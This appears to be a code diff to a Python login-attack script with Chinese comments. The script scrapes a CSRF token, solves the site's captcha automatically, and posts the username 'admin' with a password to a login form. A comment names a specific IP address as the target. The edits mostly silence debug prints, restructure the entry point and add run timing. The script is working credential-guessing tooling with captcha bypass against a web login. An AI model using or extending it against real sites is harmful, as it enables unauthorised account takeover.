@@ -47,24 +47,26 @@ def get_captcha_code():  # 获取到正确验证码
     uuid = common.create_uuid_png_name()
     # 获取验证码并识别
     captcha_code = proto_to_captcha1(base_url, dir_path + "/" + uuid)
-    print("captcha_code=", captcha_code)
+    # print("captcha_code=", captcha_code)
     return captcha_code
 
 
 def login_token():
+    global session_request
+    session_request = requests.Session()
     response = session_request.get(base_url + route_login)
     # 使用 BeautifulSoup 解析 HTML 页面
     soup = BeautifulSoup(response.content, 'html.parser')
     # 获取 __token__ 的值
     token = soup.find('input', {'name': '__token__'}).get('value')
-    print(token)
+    # print(token)
     return token
 
 
 def login_attack(username, password, code, token):  # ip.addr == 104.233.197.195 and http
     # 请求参数
     data = "name={0}&password={1}&captcha={2}&__token__={3}".format(username, password, code, token)  # 正确的
-    print(data)
+    # print(data)
     header = {
         'X-Requested-With': 'XMLHttpRequest',
         'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
@@ -84,7 +86,7 @@ def main():
     img = "captcha.png"
 
 
-if __name__ == '__main__':
+def start_task():
     token = login_token()
     captcha_code = get_captcha_code()
     username = "admin"
@@ -92,7 +94,7 @@ if __name__ == '__main__':
     login_info = login_attack(username, password, captcha_code, token)
     login_resp = common.LoginResponse()
     common.dict_to_obj(login_info, login_resp)
-    print(login_resp)
+    # print(login_resp)
     if login_resp.code == 1:
         print("登录成功,用户名{},密码{}".format(username, password))
     else:
@@ -100,3 +102,10 @@ if __name__ == '__main__':
         # print(login_info['msg'])
         # if "验证码不正确" in print['msg']:
         #     print("重试1次,本次密码{0},验证码{1}".format(password, captcha_code))
+
+
+if __name__ == '__main__':
+    start = time.time()
+    start_task()
+    end = time.time()
+    print("cost:", end - start, "seconds")
